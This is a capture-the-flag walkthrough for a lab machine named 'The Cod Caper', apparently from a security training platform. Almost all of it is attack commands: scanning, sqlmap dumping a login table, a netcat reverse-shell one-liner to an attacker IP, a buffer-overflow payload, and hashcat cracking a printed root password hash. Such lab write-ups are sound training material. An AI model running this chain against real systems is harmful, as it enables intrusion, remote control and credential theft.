# The Cod Caper

- Run nmap 
```
nmap -sC -sV -Pn -oN nmap/initial 10.10.40.147
```
- ssh and http are running on the server
- Run gobuster on the server
```
gobuster dir -u http://10.10.40.147:80/ -w big.txt -x php,js,css,html,py,sh,cfg,txt
```
- Found administrator.php
- Checking for sql injection using sqlmap
```
sqlmap -u http://10.10.40.147/administrator.php --forms --dump
```
- Form is vulnerable to sqli
```
Database: users
Table: users
[1 entry]
+------------+----------+
| password   | username |
+------------+----------+
| secretpass | pingudad |
+------------+----------+

```
- Login using these credentials
- Get a reverse shell using nc
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.73.202 4242 >/tmp/f
```
- Send the linpeas.sh to the server
    - Create an http server in the dir where linpeas.sh is present on the attack machine
    - Then download the file using wget or curl on the victim machine

- Found a hidden dir in /var/hidden where the password is stored
```
Password: pinguapingu
```
- Run linpeas.sh and there is a binary in `/opt/secret/root`
- The file is vulnerable to buffer overflow
```
python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root
```
- Found the root hash password
```
root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::
```
- Used hashcat to crack  the hash
```
hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
- The password is `love2fish`